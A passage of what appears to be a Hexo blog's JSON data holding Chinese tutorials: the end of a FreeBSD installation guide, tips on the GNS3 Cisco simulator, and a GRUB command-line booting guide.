href=\"http://wiki.freebsdchina.org/_detail/howto/i/36-user_confirmation_requested-user_and_group_management.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:36-user_confirmation_requested-user_and_group_management.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/36-user_confirmation_requested-user_and_group_management.jpg\" /></a></p><p>[User]<br />这里我们增加个wheel组的用户</p><a name=\"第三十八步增加一用户\">第三十八步:增加一用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:37-user_confirmation_requested-user_and_group_management-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg\" /></a></p><p>这里要注意,Group和Member  groups输入wheel,这个用户用来远程SSH登陆,切记切记,一定要设个密码,不然你的服务器就会变成公共场所了</p><a name=\"第三十九步退出用户管理\">第三十九步:退出用户管理</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/38-user_confirmation_requested-exit.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:38-user_confirmation_requested-exit.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/38-user_confirmation_requested-exit.jpg\" /></a></p><a name=\"第四十步提示信息\">第四十步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/39-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:39-message.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/39-message.jpg\" /></a></p><p>大意是:设置一个ROOT帐号的密码</p><a name=\"第四十一步设置root帐号的密码\">第四十一步:设置root帐号的密码</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/40-root_password.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:40-root_password.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/40-root_password.jpg\" /></a></p><p>一定要设的长一点哪,不过不要设完后自已也忘了密码 (偶就经常出这样的事故 -</em>-! )</p><a name=\"第四十二步不知道怎么翻译了\">第四十二步: ….. 不知道怎么翻译了</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/41-user_confirmation_requested-configuration_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:41-user_confirmation_requested-configuration_menu.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/41-user_confirmation_requested-configuration_menu.jpg\" /></a></p><a name=\"第四十三步退出安装\">第四十三步:退出安装</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/42-exit_install.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:42-exit_install.jpg\"><img src=\"http://wiki.freebsdchina.org/_me\ndia/howto/i/42-exit_install.jpg\" /></a></p><p>选择[X Exit Instll]我们退出安装</p><a name=\"最后一步重启\">最后一步:重启</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/43-remve_cd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:43-remve_cd.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/43-remve_cd.jpg\" /></a></p><p>这里要注意,一定要拿出光盘,后再选择[YES],切记切记</p><p>OK全文结束，累死我家毛驴了</p></p>\n"},{"title":"GNS3模拟器的应用注意事项","date":"2010-04-01T07:50:00.000Z","_content":"向大家推荐一个cisco模拟器GNS3，GNS3的确是个非常不错的cisco模拟器。和小凡的原理一样的，面对小凡超高的CPU利用率，你的电脑还能受得了吗，那里用GNS3吧，cpu利用率超少。<br />1.安装路径不要使用中文目录。安装路径最好默认，不要安装到中文文件夹里，这样会出现很多问题。<br />2.存放ISO文件的文件路径应为英文的，桌面也不行（桌面是中文）我就吃这方面的亏了。提示错误***Error: 209-unable to start VM instance 'R1'<br />3.在首选项里指定dynamips-wxp.exe的路径，并检测。不指定，有时候会提示。<br />4.开始路由器时，CPU使用率高，计算idle。路由器右键 idle pc 。多试几遍，最好选择带*的idle值。<br /><br />用过工大瑞普的朋友，应该会用命令行，挺方便的。。","source":"_posts/GNS3模拟器的应用注意事项.md","raw":"title: GNS3模拟器的应用注意事项\ncategories: [网络工程]\ntags: []\ndate: 2010-04-01 15:50:00\n---\n向大家推荐一个cisco模拟器GNS3，GNS3的确是个非常不错的cisco模拟器。和小凡的原理一样的，面对小凡超高的CPU利用率，你的电脑还能受得了吗，那里用GNS3吧，cpu利用率超少。<br />1.安装路径不要使用中文目录。安装路径最好默认，不要安装到中文文件夹里，这样会出现很多问题。<br />2.存放ISO文件的文件路径应为英文的，桌面也不行（桌面是中文）我就吃这方面的亏了。提示错误***Error: 209-unable to start VM instance 'R1'<br />3.在首选项里指定dynamips-wxp.exe的路径，并检测。不指定，有时候会提示。<br />4.开始路由器时，CPU使用率高，计算idle。路由器右键 idle pc 。多试几遍，最好选择带*的idle值。<br /><br />用过工大瑞普的朋友，应该会用命令行，挺方便的。。","slug":"GNS3模拟器的应用注意事项","published":1,"updated":"2023-04-22T05:38:44.639Z","_id":"clgrjlxdq002e7opi3osrdsb6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>向大家推荐一个cisco模拟器GNS3，GNS3的确是个非常不错的cisco模拟器。和小凡的原理一样的，面对小凡超高的CPU利用率，你的电脑还能受得了吗，那里用GNS3吧，cpu利用率超少。<br />1.安装路径不要使用中文目录。安装路径最好默认，不要安装到中文文件夹里，这样会出现很多问题。<br />2.存放ISO文件的文件路径应为英文的，桌面也不行（桌面是中文）我就吃这方面的亏了。提示错误**<em>Error: 209-unable to start VM instance ‘R1’<br />3.在首选项里指定dynamips-wxp.exe的路径，并检测。不指定，有时候会提示。<br />4.开始路由器时，CPU使用率高，计算idle。路由器右键 idle pc 。多试几遍，最好选择带</em>的idle值。<br /><br />用过工大瑞普的朋友，应该会用命令行，挺方便的。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>向大家推荐一个cisco模拟器GNS3，GNS3的确是个非常不错的cisco模拟器。和小凡的原理一样的，面对小凡超高的CPU利用率，你的电脑还能受得了吗，那里用GNS3吧，cpu利用率超少。<br />1.安装路径不要使用中文目录。安装路径最好默认，不要安装到中文文件夹里，这样会出现很多问题。<br />2.存放ISO文件的文件路径应为英文的，桌面也不行（桌面是中文）我就吃这方面的亏了。提示错误**<em>Error: 209-unable to start VM instance ‘R1’<br />3.在首选项里指定dynamips-wxp.exe的路径，并检测。不指定，有时候会提示。<br />4.开始路由器时，CPU使用率高，计算idle。路由器右键 idle pc 。多试几遍，最好选择带</em>的idle值。<br /><br />用过工大瑞普的朋友，应该会用命令行，挺方便的。。</p>\n"},{"title":"grub 命令行用法","date":"2010-05-19T03:49:00.000Z","_content":"<strong>1、用命令行来引导Linux操作系统的步骤<br /></strong><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就 显得很重要了。如果您不知道有哪些命令，可以输入help；</p><p><strong><br />1）进入GRUB的命令行模式 grub&gt;<br /></strong><br />如果开机时，GRUB出现的是<strong>grub&gt;</strong>，说明你没有/etc/grub/menu.lst  ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按<strong>Ctrl+c</strong>组合 键进入GRUB的命令行模式，会出现<strong>grub&gt;</strong> 提示符；</p><code>grub&gt;</code><p><br /><strong><br />2）获取帮助GRUB的 help<br /></strong></p><p> </p><p>只要您在<strong>grub&gt;</strong>提示符的后面输入help 就能得到GRUB所有的命令提示；</p><p> </p><code>grub&gt; help<br />blocklist FILE boot<br />cat FILE chainloader [--force] FILE<br />clear color NORMAL [HIGHLIGHT]<br />configfile FILE device DRIVE DEVICE<br />displayapm displaymem<br />find FILENAME geometry DRIVE [CYLINDER HEAD SECTOR [<br />halt [--no-apm] help [--all] [PATTERN ...]<br />hide PARTITION initrd FILE [ARG ...]<br />kernel [--no-mem-option] [--type=TYPE] makeactive<br />map TO_DRIVE FROM_DRIVE md5crypt<br />module FILE [ARG ...] modulenounzip FILE [ARG ...]<br />pager [FLAG] partnew PART TYPE START LEN<br />parttype PART TYPE quit<br />reboot root [DEVICE [HDBIAS]]<br />rootnoverify [DEVICE [HDBIAS]] serial [--unit=UNIT] [--port=PORT] [--<br />setkey [TO_KEY FROM_KEY] setup [--prefix=DIR] [--stage2=STAGE2_<br />terminal [--dumb] [--no-echo] [--no-ed terminfo [--name=NAME  --cursor-address<br />testvbe MODE unhide PARTITION<br />uppermem KBYTES vbeprobe [MODE]</code><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><p> </p><code>grub&gt;help kernel</code><p><br /><strong><br />3）cat的用法；<br /></strong></p><p> </p><p>cat指令是用来查看文件内容的，有时我们不知道Linux的/boot分区，以及/根分区所在的位置，要查看/etc/fstab的内容来得知， 这时，我们就要用到cat (hd[0-n],y)/etc/fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><code>grub&gt; cat ( 按tab  键会出来hd0或hd1之类的；<br />grub&gt; cat (hd0, 注：输入hd0,然后再按tab键；会出来分区之类的；<br />grub&gt; cat (hd0,6)<br />Possible partitions are:<br />Partition num: 0, Filesystem type unknown, partition type 0x7<br />Partition num: 4, Filesystem type is fat, partition type 0xb<br />Partition num: 5, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 6, Filesystem type is ext2fs, partition type 0x83<br />Partition num: 7, Filesystem type unknown, partition type 0x83<br />Partition num: 8, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 9, Filesystem type unknown, partition type 0x82<br />grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；<br />LABEL=/ / ext3 defaults 1 1<br />/dev/devpts /dev/pts devpts gid=5,mode=620 0 0<br />/dev/shm /dev/shm tmpfs defaults 0 0<br />/dev/proc /proc proc defaults 0 0<br />/dev/sys /sys sysfs defaults 0 0<br />LABEL=SWAP-hda1 swap swap defaults 0 0<br />/dev/hdc /media/cdrecorder auto pamconsole,exec,noauto,<br />managed 0 0</code><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出/etc/fstab就能 为以后引导带来方便；</p><p>主要查看/etc/fstab中的内容，主要是Linux的/分区及/boot是否是独立的分区；如果没有/boot类似的行，证明/boot和 Linux的/处于同一个硬盘分区；比如上面的例子中LABEL=/ 这行是极为重要的；说明Linux系统就安在标签为LABEL=/的分区中；</p><p>如果您的Linux系统/boot和/没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><p> </p><code>LABEL=/ / ext3 defaults 1 1<br />LABEL=/boot /boot ext3 defaults 1 2</code><p><strong><br />4） root (hd[0-n,y) 指令来指定/boot所在的分区；<br /></strong></p><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过  (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 /boot所在的分区；</p><p>比如我们确认/boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><code>grub&gt; root (hd0,6)</code><p>如果发现不对，可以重新来过；没有什么大不了的；</p><p><strong><br />5） kernel 指令，用来指定Linux的内核，及/所在的分区；<br /></strong></p><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；<br /><strong><br />如果我们已经通过root (hd[0-n],y) 指定了/boot所在的分区，语法有两个：<br /></strong><br />如果/boot和Linux的/位于同一个分区，应该是下面的一种格式；<br /><strong><br />kernel /boot/vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X<br /></strong><br />如果/boot有自己独立的分区，应该是；<br /><strong><br />kernel /vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X<br /></strong></p><p>在这里 root=/dev/hd[a-z]X 是Linux  的/根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)/etc/fstab  中得到Linux的/所在的分区或分区的标签；</p><p> </p><code>grub&gt; kernel  /boot/在这里按tab键；这样就列出/boot中的文件了；<br />Possible files are: grub initrd-2.6.11-1.1369_FC4.img  System.map-2.6.11-1.1369<br />_FC4 config-2.6.11-1.1369_FC4 vmlinuz-2.6.11-1.1369_FC4 grubBAK  memtest86+-1.55<br />.1 xen-syms xen.gz<br />grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong>注解：</strong> root=LABEL=/  是Linux的/所在的分区的文件系统的标签；如果您知道Linux的/在哪个具体的分区，用root=/dev/hd[a-z]X来指定也行。比如下面 的一行也是可以的；</p><p> </p><code>grub&gt; kernel  /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code><p>也可以把/boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel  中指定/boot所在的分区；所以就在下面的语法；</p><p>如果是/boot和Linux的根同处一个分区；</p><code>kernel  (hd[0-n],y)/boot/vmlinuz ro root=/dev/hd[a-z]X</code><p>比如：</p><code>grub&gt;kernel</code><p>如果是/boot和Linux所在的根不在一个分区；则是；</p><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]X</code><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p>或下面的输入，以cat 出/etc/fstab内容为准；</p><p> </p><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong><br />6）initrd 命令行来指定initrd文件；<br /></strong></p><p> </p><code>grub&gt; initrd  /boot/initrd在这里tab 来补齐；<br />grub&gt; initrd /boot/initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p>如果/boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><p> </p><code>grub&gt; initrd  /initrd在这里tab 来补齐；<br />grub&gt; initrd /initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p><br /><strong><br />7）boot 引导系统；<br /></strong></p><p> </p><p> </p><code>grub&gt;boot</code><code><strong>2、通过GRUB指令来引导 Windows ；<br /></strong></code><p> </p><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指\n令；如果我们启动 Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c  ，进入GRUB的命令模式；就可以用下面的</p><p> </p><code>grub&gt; rootnoverify  (hd0,0)<br />grub&gt; chainloader +1<br />grub&gt; boot</code>","source":"_posts/grub-命令行用法.md","raw":"title: grub 命令行用法\ncategories: [Linux]\ntags: []\ndate: 2010-05-19 11:49:00\n---\n<strong>1、用命令行来引导Linux操作系统的步骤<br /></strong><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就 显得很重要了。如果您不知道有哪些命令，可以输入help；</p><p><strong><br />1）进入GRUB的命令行模式 grub&gt;<br /></strong><br />如果开机时，GRUB出现的是<strong>grub&gt;</strong>，说明你没有/etc/grub/menu.lst  ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按<strong>Ctrl+c</strong>组合 键进入GRUB的命令行模式，会出现<strong>grub&gt;</strong> 提示符；</p><code>grub&gt;</code><p><br /><strong><br />2）获取帮助GRUB的 help<br /></strong></p><p> </p><p>只要您在<strong>grub&gt;</strong>提示符的后面输入help 就能得到GRUB所有的命令提示；</p><p> </p><code>grub&gt; help<br />blocklist FILE boot<br />cat FILE chainloader [--force] FILE<br />clear color NORMAL [HIGHLIGHT]<br />configfile FILE device DRIVE DEVICE<br />displayapm displaymem<br />find FILENAME geometry DRIVE [CYLINDER HEAD SECTOR [<br />halt [--no-apm] help [--all] [PATTERN ...]<br />hide PARTITION initrd FILE [ARG ...]<br />kernel [--no-mem-option] [--type=TYPE] makeactive<br />map TO_DRIVE FROM_DRIVE md5crypt<br />module FILE [ARG ...] modulenounzip FILE [ARG ...]<br />pager [FLAG] partnew PART TYPE START LEN<br />parttype PART TYPE quit<br />reboot root [DEVICE [HDBIAS]]<br />rootnoverify [DEVICE [HDBIAS]] serial [--unit=UNIT] [--port=PORT] [--<br />setkey [TO_KEY FROM_KEY] setup [--prefix=DIR] [--stage2=STAGE2_<br />terminal [--dumb] [--no-echo] [--no-ed terminfo [--name=NAME  --cursor-address<br />testvbe MODE unhide PARTITION<br />uppermem KBYTES vbeprobe [MODE]</code><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><p> </p><code>grub&gt;help kernel</code><p><br /><strong><br />3）cat的用法；<br /></strong></p><p> </p><p>cat指令是用来查看文件内容的，有时我们不知道Linux的/boot分区，以及/根分区所在的位置，要查看/etc/fstab的内容来得知， 这时，我们就要用到cat (hd[0-n],y)/etc/fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><code>grub&gt; cat ( 按tab  键会出来hd0或hd1之类的；<br />grub&gt; cat (hd0, 注：输入hd0,然后再按tab键；会出来分区之类的；<br />grub&gt; cat (hd0,6)<br />Possible partitions are:<br />Partition num: 0, Filesystem type unknown, partition type 0x7<br />Partition num: 4, Filesystem type is fat, partition type 0xb<br />Partition num: 5, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 6, Filesystem type is ext2fs, partition type 0x83<br />Partition num: 7, Filesystem type unknown, partition type 0x83<br />Partition num: 8, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 9, Filesystem type unknown, partition type 0x82<br />grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；<br />LABEL=/ / ext3 defaults 1 1<br />/dev/devpts /dev/pts devpts gid=5,mode=620 0 0<br />/dev/shm /dev/shm tmpfs defaults 0 0<br />/dev/proc /proc proc defaults 0 0<br />/dev/sys /sys sysfs defaults 0 0<br />LABEL=SWAP-hda1 swap swap defaults 0 0<br />/dev/hdc /media/cdrecorder auto pamconsole,exec,noauto,<br />managed 0 0</code><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出/etc/fstab就能 为以后引导带来方便；</p><p>主要查看/etc/fstab中的内容，主要是Linux的/分区及/boot是否是独立的分区；如果没有/boot类似的行，证明/boot和 Linux的/处于同一个硬盘分区；比如上面的例子中LABEL=/ 这行是极为重要的；说明Linux系统就安在标签为LABEL=/的分区中；</p><p>如果您的Linux系统/boot和/没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><p> </p><code>LABEL=/ / ext3 defaults 1 1<br />LABEL=/boot /boot ext3 defaults 1 2</code><p><strong><br />4） root (hd[0-n,y) 指令来指定/boot所在的分区；<br /></strong></p><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过  (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 /boot所在的分区；</p><p>比如我们确认/boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><code>grub&gt; root (hd0,6)</code><p>如果发现不对，可以重新来过；没有什么大不了的；</p><p><strong><br />5） kernel 指令，用来指定Linux的内核，及/所在的分区；<br /></strong></p><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；<br /><strong><br />如果我们已经通过root (hd[0-n],y) 指定了/boot所在的分区，语法有两个：<br /></strong><br />如果/boot和Linux的/位于同一个分区，应该是下面的一种格式；<br /><strong><br />kernel /boot/vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X<br /></strong><br />如果/boot有自己独立的分区，应该是；<br /><strong><br />kernel /vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X<br /></strong></p><p>在这里 root=/dev/hd[a-z]X 是Linux  的/根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)/etc/fstab  中得到Linux的/所在的分区或分区的标签；</p><p> </p><code>grub&gt; kernel  /boot/在这里按tab键；这样就列出/boot中的文件了；<br />Possible files are: grub initrd-2.6.11-1.1369_FC4.img  System.map-2.6.11-1.1369<br />_FC4 config-2.6.11-1.1369_FC4 vmlinuz-2.6.11-1.1369_FC4 grubBAK  memtest86+-1.55<br />.1 xen-syms xen.gz<br />grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong>注解：</strong> root=LABEL=/  是Linux的/所在的分区的文件系统的标签；如果您知道Linux的/在哪个具体的分区，用root=/dev/hd[a-z]X来指定也行。比如下面 的一行也是可以的；</p><p> </p><code>grub&gt; kernel  /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code><p>也可以把/boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel  中指定/boot所在的分区；所以就在下面的语法；</p><p>如果是/boot和Linux的根同处一个分区；</p><code>kernel  (hd[0-n],y)/boot/vmlinuz ro root=/dev/hd[a-z]X</code><p>比如：</p><code>grub&gt;kernel</code><p>如果是/boot和Linux所在的根不在一个分区；则是；</p><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]X</code><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p>或下面的输入，以cat 出/etc/fstab内容为准；</p><p> </p><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong><br />6）initrd 命令行来指定initrd文件；<br /></strong></p><p> </p><code>grub&gt; initrd  /boot/initrd在这里tab 来补齐；<br />grub&gt; initrd /boot/initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p>如果/boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><p> </p><code>grub&gt; initrd  /initrd在这里tab 来补齐；<br />grub&gt; initrd /initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p><br /><strong><br />7）boot 引导系统；<br /></strong></p><p> </p><p> </p><code>grub&gt;boot</code><code><strong>2、通过GRUB指令来引导 Windows ；<br /></strong></code><p> </p><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指\n令；如果我们启动 Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c  ，进入GRUB的命令模式；就可以用下面的</p><p> </p><code>grub&gt; rootnoverify  (hd0,0)<br />grub&gt; chainloader +1<br />grub&gt; boot</code>","slug":"grub-命令行用法","published":1,"updated":"2023-04-22T05:38:44.765Z","_id":"clgrjlxds002f7opif5kxcy4r","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>1、用命令行来引导Linux操作系统的步骤<br /></strong><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就 显得很重要了。如果您不知道有哪些命令，可以输入help；</p><p><strong><br />1）进入GRUB的命令行模式 grub&gt;<br /></strong><br />如果开机时，GRUB出现的是<strong>grub&gt;</strong>，说明你没有&#x2F;etc&#x2F;grub&#x2F;menu.lst  ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按<strong>Ctrl+c</strong>组合 键进入GRUB的命令行模式，会出现<strong>grub&gt;</strong> 提示符；</p><code>grub&gt;</code><p><br /><strong><br />2）获取帮助GRUB的 help<br /></strong></p><p> </p><p>只要您在<strong>grub&gt;</strong>提示符的后面输入help 就能得到GRUB所有的命令提示；</p><p> </p><code>grub&gt; help<br />blocklist FILE boot<br />cat FILE chainloader [--force] FILE<br />clear color NORMAL [HIGHLIGHT]<br />configfile FILE device DRIVE DEVICE<br />displayapm displaymem<br />find FILENAME geometry DRIVE [CYLINDER HEAD SECTOR [<br />halt [--no-apm] help [--all] [PATTERN ...]<br />hide PARTITION initrd FILE [ARG ...]<br />kernel [--no-mem-option] [--type=TYPE] makeactive<br />map TO_DRIVE FROM_DRIVE md5crypt<br />module FILE [ARG ...] modulenounzip FILE [ARG ...]<br />pager [FLAG] partnew PART TYPE START LEN<br />parttype PART TYPE quit<br />reboot root [DEVICE [HDBIAS]]<br />rootnoverify [DEVICE [HDBIAS]] serial [--unit=UNIT] [--port=PORT] [--<br />setkey [TO_KEY FROM_KEY] setup [--prefix=DIR] [--stage2=STAGE2_<br />terminal [--dumb] [--no-echo] [--no-ed terminfo [--name=NAME  --cursor-address<br />testvbe MODE unhide PARTITION<br />uppermem KBYTES vbeprobe [MODE]</code><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><p> </p><code>grub&gt;help kernel</code><p><br /><strong><br />3）cat的用法；<br /></strong></p><p> </p><p>cat指令是用来查看文件内容的，有时我们不知道Linux的&#x2F;boot分区，以及&#x2F;根分区所在的位置，要查看&#x2F;etc&#x2F;fstab的内容来得知， 这时，我们就要用到cat (hd[0-n],y)&#x2F;etc&#x2F;fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><code>grub&gt; cat ( 按tab  键会出来hd0或hd1之类的；<br />grub&gt; cat (hd0, 注：输入hd0,然后再按tab键；会出来分区之类的；<br />grub&gt; cat (hd0,6)<br />Possible partitions are:<br />Partition num: 0, Filesystem type unknown, partition type 0x7<br />Partition num: 4, Filesystem type is fat, partition type 0xb<br />Partition num: 5, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 6, Filesystem type is ext2fs, partition type 0x83<br />Partition num: 7, Filesystem type unknown, partition type 0x83<br />Partition num: 8, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 9, Filesystem type unknown, partition type 0x82<br />grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；<br />LABEL=/ / ext3 defaults 1 1<br />/dev/devpts /dev/pts devpts gid=5,mode=620 0 0<br />/dev/shm /dev/shm tmpfs defaults 0 0<br />/dev/proc /proc proc defaults 0 0<br />/dev/sys /sys sysfs defaults 0 0<br />LABEL=SWAP-hda1 swap swap defaults 0 0<br />/dev/hdc /media/cdrecorder auto pamconsole,exec,noauto,<br />managed 0 0</code><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出&#x2F;etc&#x2F;fstab就能 为以后引导带来方便；</p><p>主要查看&#x2F;etc&#x2F;fstab中的内容，主要是Linux的&#x2F;分区及&#x2F;boot是否是独立的分区；如果没有&#x2F;boot类似的行，证明&#x2F;boot和 Linux的&#x2F;处于同一个硬盘分区；比如上面的例子中LABEL&#x3D;&#x2F; 这行是极为重要的；说明Linux系统就安在标签为LABEL&#x3D;&#x2F;的分区中；</p><p>如果您的Linux系统&#x2F;boot和&#x2F;没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><p> </p><code>LABEL=/ / ext3 defaults 1 1<br />LABEL=/boot /boot ext3 defaults 1 2</code><p><strong><br />4） root (hd[0-n,y) 指令来指定&#x2F;boot所在的分区；<br /></strong></p><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过  (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 &#x2F;boot所在的分区；</p><p>比如我们确认&#x2F;boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><code>grub&gt; root (hd0,6)</code><p>如果发现不对，可以重新来过；没有什么大不了的；</p><p><strong><br />5） kernel 指令，用来指定Linux的内核，及&#x2F;所在的分区；<br /></strong></p><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；<br /><strong><br />如果我们已经通过root (hd[0-n],y) 指定了&#x2F;boot所在的分区，语法有两个：<br /></strong><br />如果&#x2F;boot和Linux的&#x2F;位于同一个分区，应该是下面的一种格式；<br /><strong><br />kernel &#x2F;boot&#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X<br /></strong><br />如果&#x2F;boot有自己独立的分区，应该是；<br /><strong><br />kernel &#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X<br /></strong></p><p>在这里 root&#x3D;&#x2F;dev&#x2F;hd[a-z]X 是Linux  的&#x2F;根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)&#x2F;etc&#x2F;fstab  中得到Linux的&#x2F;所在的分区或分区的标签；</p><p> </p><code>grub&gt; kernel  /boot/在这里按tab键；这样就列出/boot中的文件了；<br />Possible files are: grub initrd-2.6.11-1.1369_FC4.img  System.map-2.6.11-1.1369<br />_FC4 config-2.6.11-1.1369_FC4 vmlinuz-2.6.11-1.1369_FC4 grubBAK  memtest86+-1.55<br />.1 xen-syms xen.gz<br />grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong>注解：</strong> 